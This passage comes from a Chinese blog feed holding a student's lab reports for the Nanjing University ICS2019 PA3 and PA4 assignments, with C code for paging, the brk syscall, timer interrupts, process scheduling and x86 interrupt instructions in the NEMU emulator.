class="hljs-type">void</span> *pa=<span class="hljs-built_in">new_page</span>(<span class="hljs-number">1</span>);_map(&amp;(current-&gt;as),(<span class="hljs-type">void</span>*)(current-&gt;max_brk),pa,<span class="hljs-number">1</span>);current-&gt;max_brk+=PGSIZE;}}  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><p><code>new_pgnum</code>计算了需要分配的页面个数。看上去很简单粗暴。为什么不用考虑页面对齐问题？因为我实现的<code>loader</code>加载的时候分配的<code>max_brk</code>值是页面对齐的，这里更新的时候<code>current-&gt;max_brk+=PGSIZE;</code>也是页面对齐的，因此就不需要考虑<code>brk+increment</code>与 <code>max_brk</code>在同一页面上的问题。</p><p>我们这是在<code>mm</code>中，要想访问当前进程的<code>max_brk</code>需要从进程控制块中获取。因此需要</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x5r2z4lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-x5r2z4lluwpkzu"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"proc.h"</span></span><span class="hljs-keyword">extern</span> PCB *current;</code></pre></div></div><p>别忘了在系统调用里注册新实现的<code>max_brk</code>，一开始实现完了忘了注册，缺一堆页，排查了一个多小时发现是忘了在系统调用更新。</p><p><code>_Context *do_syscall(_Context *c)</code>:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-5mq65ylluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-5mq65ylluwpkzu"><pre><code class="hljs C++"> <span class="hljs-keyword">case</span> SYS_brk:{<span class="hljs-built_in">Log</span>(<span class="hljs-string">"brk syscall"</span>);<span class="hljs-comment">//_end=*((char*)c-&gt;GPR2);</span><span class="hljs-built_in">mm_brk</span>((<span class="hljs-type">uintptr_t</span>)a[<span class="hljs-number">1</span>],(<span class="hljs-type">intptr_t</span>)a[<span class="hljs-number">2</span>]);c-&gt;GPRx=<span class="hljs-number">0</span>;<span class="hljs-keyword">break</span>;}</code></pre></div></div><p>好了，我们跑一下仙剑奇侠传看看:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205720681183_927_20230601235540421541_424_image-20230530221047921.png" alt="image-20230530221047921"><figcaption aria-hidden="true">image-20230530221047921</figcaption></figure><p>emm。确实如讲义所说。我们现在不得不处理数据跨页的问题了。</p><p>跨页的思路也不难，在<code>vaddr_read</code>中将两次读取的字节进行整合，在<code>vaddr_write</code> 中将需要写入的字节进行拆分并分别写入两个页面即可。</p><p><code>read</code>的处理如下:write是完全类似的。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ijm3x5lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-ijm3x5lluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">else</span>{  <span class="hljs-comment">// printf("the data is in two pages\n");</span>  <span class="hljs-comment">// assert(0);</span>  <span class="hljs-comment">// the data is in two pages</span>  <span class="hljs-type">int</span> first_page_len = PAGE_SIZE - <span class="hljs-built_in">OFF</span>(addr);  <span class="hljs-comment">// printf("crossong page data addr:%x\n", addr);</span>  <span class="hljs-type">paddr_t</span> paddr = <span class="hljs-built_in">page_translate</span>(addr);  <span class="hljs-type">uint32_t</span> first_page_data = <span class="hljs-built_in">paddr_read</span>(paddr, first_page_len);  paddr = <span class="hljs-built_in">page_translate</span>(addr + first_page_len);  <span class="hljs-type">uint32_t</span> second_page_data = <span class="hljs-built_in">paddr_read</span>(paddr, len - first_page_len);  <span class="hljs-keyword">return</span> (second_page_data &lt;&lt; (first_page_len * <span class="hljs-number">8</span>)) + first_page_data;}</code></pre></div></div><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-pq691clluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-pq691clluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">else</span>{  <span class="hljs-comment">// printf("the data is in two pages\n");</span>  <span class="hljs-comment">// assert(0);</span>  <span class="hljs-comment">// the data is in two pages</span>  <span class="hljs-type">int</span> first_page_len = PAGE_SIZE - <span class="hljs-built_in">OFF</span>(addr);  <span class="hljs-comment">// printf("crossong page data addr:%x\n", addr);</span>  <span class="hljs-type">paddr_t</span> paddr = <span class="hljs-built_in">page_translate</span>(addr);  <span class="hljs-built_in">paddr_write</span>(paddr, data &amp; ((<span class="hljs-number">1</span> &lt;&lt; (first_page_len * <span class="hljs-number">8</span>)) - <span class="hljs-number">1</span>), first_page_len);  paddr = <span class="hljs-built_in">page_translate</span>(addr + first_page_len);  <span class="hljs-built_in">paddr_write</span>(paddr, data &gt;&gt; (first_page_len * <span class="hljs-number">8</span>), len - first_page_len);}</code></pre></div></div><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205722617786_472_20230601235542835305_606_image-20230531155347228.png" alt="image-20230531155347228" width="67%" height="67%"></p><h3 id="支持虚存管理的多道程序">支持虚存管理的多道程序</h3><p>这次只需要把调度代码改回去就可以了，不需要做额外的事情。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205725791533_135_20230601235547658121_402_image-20230531164538774.png" alt="image-20230531164538774"><figcaption aria-hidden="true">image-20230531164538774</figcaption></figure><h2 id="阶段三">阶段三</h2><h3 id="实现抢占多任务">实现抢占多任务</h3><blockquote><p>时钟中断通过<code>nemu/src/device/timer.c</code>中的<code>timer_intr()</code>触发,每10ms触发一次. 触发后,会调用<code>dev_raise_intr()</code>函数(在<code>nemu/src/device/intr.c</code>中定义).你需要:</p><ul><li>在<code>cpu</code>结构体中添加一个<code>bool</code>成员<code>INTR</code>.</li><li>在<code>dev_raise_intr()</code>中将INTR引脚设置为高电平.</li><li>在<code>exec_once()</code>的末尾添加轮询INTR引脚的代码,每次执行完一条指令就查看是否有硬件中断到来:</li></ul></blockquote><p>这三步照着做即可。</p><blockquote><ul><li>实现<code>isa_query_intr()</code>函数(在<code>nemu/src/isa/$ISA/intr.c</code>中定义):</li></ul></blockquote><p>注意Interrupt Enable Flag ，等于1接收中断响应。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qyj9rmlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-qyj9rmlluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isa_query_intr</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> </span>{<span class="hljs-keyword">if</span> (cpu.INTR==<span class="hljs-literal">true</span>&amp;&amp;cpu.eflags.IF==<span class="hljs-number">1</span>){cpu.INTR=<span class="hljs-literal">false</span>;<span class="hljs-built_in">raise_intr</span>(IRQ_TIMER,cpu.pc);<span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;}<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;}</code></pre></div></div><blockquote><ul><li>修改<code>raise_intr()</code>中的代码, 让处理器进入关中断状态:</li></ul></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c63lnolluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-c63lnolluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">raise_intr</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> NO, <span class="hljs-type">vaddr_t</span> ret_addr)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Trigger an interrupt/exception with ``NO''.</span><span class="hljs-comment">   * That is, use ``NO'' to index the IDT.</span><span class="hljs-comment">   */</span>  <span class="hljs-comment">// step1</span>  <span class="hljs-built_in">rtl_push</span>(&amp;cpu.eflags.val);  <span class="hljs-built_in">rtl_push</span>(&amp;cpu.cs);  <span class="hljs-built_in">rtl_push</span>(&amp;ret_addr);  cpu.eflags.IF = <span class="hljs-number">0</span>;  <span class="hljs-comment">// step2</span>  <span class="hljs-type">uint32_t</span> gate_addr = cpu.idtr.base, len = cpu.idtr.limit;  <span class="hljs-keyword">if</span> (len &lt;= NO)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"the number is larger than the length of IDT!\n"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }  <span class="hljs-comment">//step3</span>  <span class="hljs-type">uint32_t</span> val_l, val_h, p;  val_l = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span>, <span class="hljs-number">2</span>);  val_h = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, <span class="hljs-number">2</span>);  p = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span> + <span class="hljs-number">5</span>, <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">7</span>;  <span class="hljs-comment">//actually no need to check p for NEMU, but we can do it.</span>  <span class="hljs-keyword">if</span> (!p)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"The gatedesc is not allowed!"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }  <span class="hljs-comment">//step4</span>  <span class="hljs-comment">//using rtl api</span>  <span class="hljs-type">vaddr_t</span> goal = (val_h &lt;&lt; <span class="hljs-number">16</span>) + val_l;  <span class="hljs-built_in">rtl_j</span>(goal);}</code></pre></div></div><blockquote><p>在软件上, 你还需要:</p><ul><li>在CTE中添加时钟中断的支持,将时钟中断打包成<code>_EVENT_IRQ_TIMER</code>事件.</li><li>Nanos-lite收到<code>_EVENT_IRQ_TIMER</code>事件之后,调用<code>_yield()</code>来强制当前进程让出CPU,同时也可以去掉我们之前在设备访问中插入的<code>_yield()</code>了.</li><li>为了可以让处理器在运行用户进程的时候响应时钟中断,你还需要修改<code>_ucontext()</code>的代码, 在构造上下文的时候,设置正确中断状态, 使得将来返回到用户进程后CPU处于开中断状态.</li></ul></blockquote><p>这三条也是照着做即可。</p><p>最后讲义中没提到的，是在<code>__am_irq_handle</code>中注册<code>_EVENT_IRQ_TIMER</code>。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-km87tzlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-km87tzlluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> <span class="hljs-number">32</span>:  ev.event = _EVENT_IRQ_TIMER;  <span class="hljs-keyword">break</span>;</code></pre></div></div><p>可以看到每隔一段时间都触发一次时钟中断事件。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205726912624_659_20230601235551684634_469_image-20230531172613664.png" alt="image-20230531172613664"><figcaption aria-hidden="true">image-20230531172613664</figcaption></figure><h3 id="展示你的计算机系统">展示你的计算机系统</h3><blockquote><p>我们可以在Nanos-lite的<code>events_read()</code>函数中让<code>F1</code>,<code>F2</code>, <code>F3</code>这3个按键来和3个前台程序绑定, 例如,一开始是仙剑奇侠传和hello程序分时运行, 按下<code>F3</code>之后,就变成slider和hello程序分时运行. 如果你没有实现Navy-apps之上的AM,可以加载3份仙剑奇侠传, 让它们分别读取不同的存档进行游戏.</p></blockquote><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-iv39p4lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-iv39p4lluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (key &amp; <span class="hljs-number">0x8000</span>){  <span class="hljs-comment">//0x8002 to 0x8004 are F1 to F3</span>  <span class="hljs-keyword">if</span> (key&gt;=<span class="hljs-number">0x8002</span>&amp;&amp;key&lt;=<span class="hljs-number">0x8004</span>) <span class="hljs-built_in">change_gcb</span>(key<span class="hljs-number">-0x8001</span>);  <span class="hljs-built_in">sprintf</span>((<span class="hljs-type">char</span> *)buf, <span class="hljs-string">"kd %s\n"</span>, keyname[key &amp; <span class="hljs-number">0x7fff</span>]);}</code></pre></div></div><p><code>amdev.h</code>里有张键位表，可以参考。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205728206939_964_20230601235555185137_348_image-20230531192942805.png" alt="image-20230531192942805"><figcaption aria-hidden="true">image-20230531192942805</figcaption></figure><p><code>change_gcb</code>需要添加外部引用。在<code>proc.c</code>定义:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-h51xg7lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-h51xg7lluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">uint32_t</span> fg_pcb;<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">change_gcb</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> id)</span> </span>{ fg_pcb = id; }</code></pre></div></div><p>修改<code>schedule</code>:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ywvkm9lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-ywvkm9lluwpkzu"><pre><code class="hljs C++"><span class="hljs-type">uint32_t</span> now_id = <span class="hljs-number">0</span>;<span class="hljs-function">_Context *<span class="hljs-title">schedule</span><span class="hljs-params">(_Context *prev)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">// save the context pointer</span>  current-&gt;cp = prev;  <span class="hljs-keyword">if</span> (now_id != fg_pcb)  {    now_id = fg_pcb;    current = &amp;pcb[fg_pcb];  }  <span class="hljs-keyword">else</span>  {    now_id = <span class="hljs-number">0</span>;    current = &amp;pcb[<span class="hljs-number">0</span>];  }  <span class="hljs-comment">// current = ((current == &amp;pcb[0]) ? &amp;pcb[1] : &amp;pcb[0]);</span>  <span class="hljs-comment">// current = &amp;pcb[0];</span>  <span class="hljs-comment">// then return the new context</span>  <span class="hljs-keyword">return</span> current-&gt;cp;}</code></pre></div></div><p>为了更清晰的验证实现的效果，我将hello的输出注释掉了，并添加了键盘事件的Log。可以看到按F1-F3键的时候游戏会重新进入，hello也在一直运行。当然如果一直按的和上一次相同的按键不会有变化。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205729380091_270_20230601235557711505_227_image-20230531192547493.png" alt="image-20230531192547493"><figcaption aria-hidden="true">image-20230531192547493</figcaption></figure><h2 id="必答题">必答题</h2><h6 id="hello程序是什么-它从而何来-要到哪里去">hello程序是什么,它从而何来, 要到哪里去</h6><p>hello 程序在磁盘上，hello.c 被编译成 ELF 文件后，位于 ramdisk中。当用户运行该程序时，通过 naive_uload函数读入指定的内存并放在正确的位置。加载完成后，操作系统从其 ELF信息中获取到程序入口地址，通过上下文切换从入口地址处继续执行，hello程序便获取到 CPU 的控制权开始执行指令。</p><p>对于字符串在终端的显示，首先调用<code>printf</code>等库函数，然后通过 <code>SYS_write</code>系统调用来输出字符，系统调用通过调用外设的驱动程序最终将内容在外设中表现出来，程序执行完毕后操作系统会回收其内存空间。</p><p>上述只是大致的流程，展开来讲的话每一句话都可以拓展很多。由于时间有限这里就不展开了。</p><h6 id="上下文切换的具体过程">上下文切换的具体过程</h6><p>首先回顾PA3的选做题</p><blockquote><p>AM究竟给程序提供了多大的栈空间呢?</p></blockquote><p>观察<code>nexus-am/am/src/x86/nemu/boot/loader.ld</code>这个链接脚本可以发现，其中定义了一个符号<code>_stack_pointer</code></p><p>而根据AM启动客户程序的流程可知，在<code>nexus-am/am/src/x86/nemu/boot/start.S</code>中的<code>_start:</code>中将会执行<code>mov $_stack_pointer, %esp</code>，以此初始化栈指针。又注意到<code>_stack_top</code>符号的地址与之相差<code>0x8000</code>，因此可以回答AM中程序的栈空间大小为<code>0x8000</code>字节。</p><p>当然在在本次实验中也可以查看PCB的结构:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-3s49hmlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-3s49hmlluwpkzu"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> STACK_SIZE (8 * PGSIZE)</span><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">union</span> {  <span class="hljs-type">uint8_t</span> stack[STACK_SIZE] PG_ALIGN;  <span class="hljs-keyword">struct</span> {    _Context *cp;    _AddressSpace as;    <span class="hljs-comment">// we do not free memory, so use `max_brk' to determine when to call _map()</span>    <span class="hljs-type">uintptr_t</span> max_brk;  };} PCB;</code></pre></div></div><p><code>STACK_SIZE (8 * PGSIZE)=8*4096=32768=0x8000</code>,和从汇编中的得到的结果是一致的。</p><p>在这次实验指导书中也有说明:</p><blockquote><p>代码为每一个进程分配了一个32KB的堆栈, 已经足够使用了,不会出现栈溢出导致UB.</p></blockquote><p>结合PA3的前两个必答题，在此以内核进程<code>hello</code>为例，将上下文切换的整个细节总结如下:</p><p><a href="https://excalidraw.com/#json=5d-KBtTMJBi6eNu4fkmrg,jm4Dt4nkNF8tgd7ix_B7ng">excalidraw</a></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA4/20230828205730980698_757_20230602001029829434_199_trap1.png" alt="trap1"><figcaption aria-hidden="true">trap1</figcaption></figure><h6 id="分时多任务的具体过程">分时多任务的具体过程</h6><blockquote><p>请结合代码,解释分页机制和硬件中断是如何支撑仙剑奇侠传和hello程序在我们的计算机系统(Nanos-lite,AM, NEMU)中分时运行的.</p></blockquote><p>分页机制由 Nanos-lite、AM 和 NEMU 配合实现。</p><ul><li><p>首先，NEMU 提供 CR0 与 CR3寄存器来辅助实现分页机制，CR0用于开启分页，CR3 记录页表基地址。随后，MMU进行分页地址的转换，在代码中表现为 NEMU 的<code>vaddr_read()</code>与<code>vaddr_write()</code>。</p></li><li><p>当启动一个用户进程后，Nanos-lite会在开头调用<code>_protect()</code>,它是AM中的功能，可以实现地址空间的创建，并且将内核空间映射到用户空间。之后进行<code>loader()</code>，在loader函数中与之前不同是，操作系统使用分页机制对其进行存储和加载，通过new_page 获得新的物理页，并用到AM中 <code>_map</code>以建立虚拟地址与物理地址的映射关系，退出后调用am中的<code>_ucontext</code>，在栈上创建必要的上下文信息和参数信息，而分页机制则保证了进程在对应虚拟地址存取信息时，在NEMU中能够通过<code>page_translate()</code>函数等完成到物理地址的转换，从而获得正确的信息。</p></li><li><p>之后在NEMU中运行时，每10ms在 <code>timer_intr()</code>触发一次时钟中断，此时NEMU检测到 <code>isa_query_intr()</code>为true，同时也会在该函数中调用<code>raise_intr</code>，为中断事件做准备并产生异常号。而操作系统接受到<code>_EVENT_IRQ_TIMER</code> 后调用 <code>_yield()</code>强行暂停该进程，最后在<code>schedule</code>中更换当前进程，通过AM的<code>_switch()</code>切换进程的虚拟内存空间， 并将进程的上下文传递给AM，AM 的 <code>asm_trap()</code>恢复这一现场。NEMU 执行下一条指令时，便开始新进程的运行。完成进程转换，如此反复形成分时运行。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>南京大学ics2019_PA3</title>
    <link href="/posts/28172/"/>
    <url>/posts/28172/</url>
    
    <content type="html"><![CDATA[<h1 id="pa3实验报告">PA3实验报告</h1><p>2013599 田佳业</p><h2 id="一阶段">一阶段</h2><h3 id="实现异常响应机制">实现异常响应机制</h3><p>对于x86，"上文提到的新指令“比较多，这里先按在<code>nanos-lite</code>中<code>make ARCH=x86-nemu run</code>报错的顺序来补充指令。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211426961668_883_20230601235657523461_176_image-20230501195612494.png" alt="image-20230501195612494"><figcaption aria-hidden="true">image-20230501195612494</figcaption></figure><p>查看手册，这是<code>Grp7</code>中<code>lidt</code>指令。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211428026749_969_20230601235659951694_782_image-20230501195859504.png" alt="image-20230501195859504"><figcaption aria-hidden="true">image-20230501195859504</figcaption></figure><p>IDTR的格式在这，Figure9-1:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211429350111_168_20230601235705286388_738_image-20230501202135298.png" alt="image-20230501202135298"><figcaption aria-hidden="true">image-20230501202135298</figcaption></figure><p>因此我们的寄存器结构应该长这样:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ffuzuwlluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-ffuzuwlluwpkzu"><pre><code class="hljs C++"><span class="hljs-keyword">struct</span>{    <span class="hljs-type">rtlreg_t</span> limit : <span class="hljs-number">16</span>;    <span class="hljs-type">rtlreg_t</span> base : <span class="hljs-number">32</span>;} idtr;</code></pre></div></div><p>下面为其添加执行操作。我们可以在手册中查到对应的伪代码。因为我们用不到GDT(NEMU里没有分段机制)，因此只看上面部分即可。而且我们是模拟32位机器，根据我们寄存器结构的实现，我们只需要实现<code>ELSE</code>部分即可。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211430306114_209_20230601235710126502_482_image-20230501202925594.png" alt="image-20230501202925594"><figcaption aria-hidden="true">image-20230501202925594</figcaption></figure><p>综上，代码如下所示:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-gl9hfglluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-gl9hfglluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(lidt) {  <span class="hljs-comment">//TODO();</span>  <span class="hljs-built_in">rtl_li</span>(&amp;s0,id_dest-&gt;addr);  cpu.idtr.limit=<span class="hljs-built_in">vaddr_read</span>(s0,<span class="hljs-number">2</span>);  cpu.idtr.base=<span class="hljs-built_in">vaddr_read</span>(s0+<span class="hljs-number">2</span>,<span class="hljs-number">4</span>);  <span class="hljs-built_in">print_asm_template1</span>(lidt);}</code></pre></div></div><p>注册新指令，跑一下:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211431479331_469_20230601235712152820_107_image-20230501205158212.png" alt="image-20230501205158212"><figcaption aria-hidden="true">image-20230501205158212</figcaption></figure><p>嗯，该实现<code>int</code>指令了(之前注册过opcode_table，所以直接跳到这里了)</p><p>讲义中特意提及:</p><blockquote><p>你需要在自陷指令的helper函数中调用<code>raise_intr()</code>,而不要把异常响应机制的代码放在自陷指令的helper函数中实现,因为在后面我们会再次用到<code>raise_intr()</code>函数.</p></blockquote><p>因此我们先看这个函数该怎么实现。代码里只有一对括号，但讲义告诉我们了触发中断的响应过程:</p><ol type="1"><li>依次将eflags, cs(代码段寄存器), eip(也就是PC)寄存器的值压栈</li><li>从IDTR中读出IDT的首地址</li><li>根据异常号在IDT中进行索引, 找到一个门描述符</li><li>将门描述符中的offset域组合成异常入口地址</li><li>跳转到异常入口地址</li></ol><p>为了diftest，我们需要手动添加<code>cs</code>寄存器，在寄存器结构体里补充一下即可。</p><p>下面是依据四个步骤实现的<code>raise_intr</code>。其中额外关中断防止嵌套中断，并检查了特权级(额外是指不这么做也不影响NEMU实现的正确)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-h09vgclluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-h09vgclluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">raise_intr</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> NO, <span class="hljs-type">vaddr_t</span> ret_addr)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> Trigger an interrupt/exception with ``NO''.</span><span class="hljs-comment">   * That is, use ``NO'' to index the IDT.</span><span class="hljs-comment">   */</span>  <span class="hljs-comment">// step1</span>  <span class="hljs-built_in">rtl_push</span>(&amp;cpu.eflags.val);  <span class="hljs-built_in">rtl_push</span>(&amp;cpu.cs);  <span class="hljs-built_in">rtl_push</span>(&amp;ret_addr);  cpu.eflags.IF = <span class="hljs-number">0</span>;  <span class="hljs-comment">// step2</span>  <span class="hljs-type">uint32_t</span> gate_addr = cpu.idtr.base, len = cpu.idtr.limit;  <span class="hljs-keyword">if</span> (len &lt;= NO)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"the number is larger than the length of IDT!\n"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }  <span class="hljs-comment">//step3</span>  <span class="hljs-type">uint32_t</span> val_l, val_h, p;  val_l = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span>, <span class="hljs-number">2</span>);  val_h = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span> + <span class="hljs-number">6</span>, <span class="hljs-number">2</span>);  p = <span class="hljs-built_in">vaddr_read</span>(gate_addr + NO * <span class="hljs-number">8</span> + <span class="hljs-number">5</span>, <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">7</span>;  <span class="hljs-comment">//actually no need to check p for NEMU, but we can do it.</span>  <span class="hljs-keyword">if</span> (!p)  {    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"The gatedesc is not allowed!"</span>);    <span class="hljs-built_in">assert</span>(<span class="hljs-number">0</span>);  }  <span class="hljs-comment">//step4</span>  <span class="hljs-comment">//using rtl api</span>  <span class="hljs-type">vaddr_t</span> goal = (val_h &lt;&lt; <span class="hljs-number">16</span>) + val_l;  <span class="hljs-built_in">rtl_j</span>(goal);}</code></pre></div></div><p>int指令根据手册有三种。<code>0xcc</code>的是断点，<code>0xcd</code>的是一般的中断指令，<code>0xce</code>是溢出中断指令。<code>0xcc</code>和<code>0xce</code>中断号分别为3和4。<code>decinfo.seq_pc</code>中保存的是int指令的下一条指令。因此可以做以下实现:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-2ottcylluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-2ottcylluwpkzu"><pre><code class="hljs C++"><span class="hljs-built_in">make_EHelper</span>(<span class="hljs-type">int</span>) {<span class="hljs-comment">//  TODO();</span>  <span class="hljs-keyword">switch</span>(decinfo.opcode){    <span class="hljs-keyword">case</span> <span class="hljs-number">0xcc</span> : <span class="hljs-built_in">raise_intr</span>(<span class="hljs-number">0x3</span>,decinfo.seq_pc);  <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xcd</span> : <span class="hljs-built_in">raise_intr</span>(id_dest-&gt;val, decinfo.seq_pc); <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> <span class="hljs-number">0xce</span> : <span class="hljs-built_in">raise_intr</span>(<span class="hljs-number">0x4</span>, decinfo.seq_pc); <span class="hljs-keyword">break</span>;    }  <span class="hljs-built_in">print_asm</span>(<span class="hljs-string">"int %s"</span>, id_dest-&gt;str);  <span class="hljs-built_in">difftest_skip_dut</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);}</code></pre></div></div><p>写完之后发现报错，是没有外部声明。在开头加上外部声明:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c1i543lluwpkzu"></i><span>C++</span><div class="collapse show" id="collapse-c1i543lluwpkzu"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">raise_intr</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> NO, <span class="hljs-type">vaddr_t</span> ret_addr)</span></span>;</code></pre></div></div><p>关于讲义中提到阅读<code>_cte_init()</code>的代码,找出相应的异常入口地址:对x86来说,这个函数就是准备了一个有意义的IDT，出现异常的时候根据IDTR中保存的信息去找中断向量表即可。这个过程上面已经实现了。</p><p>然后是<code>iret</code>。这就是保存上下文部分的工作了，说明这一部分已经完成。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211432470334_640_20230601235717680355_998_image-20230501215158239.png" alt="image-20230501215158239"><figcaption aria-hidden="true">image-20230501215158239</figcaption></figure><h3 id="保存上下文">保存上下文</h3><p><code>iret</code>指令手册说的很复杂，但由于NEMU不涉及特权级和段机制，因此我们只需要关注一句话:</p><blockquote><p>In Real Address Mode, IRET pops the instruction pointer, CS, and theflags register from the stack and resumes the interrupted routine.</p></blockquote><p>故可实现如下:</p><div class="code-wrapper"><i class="fa 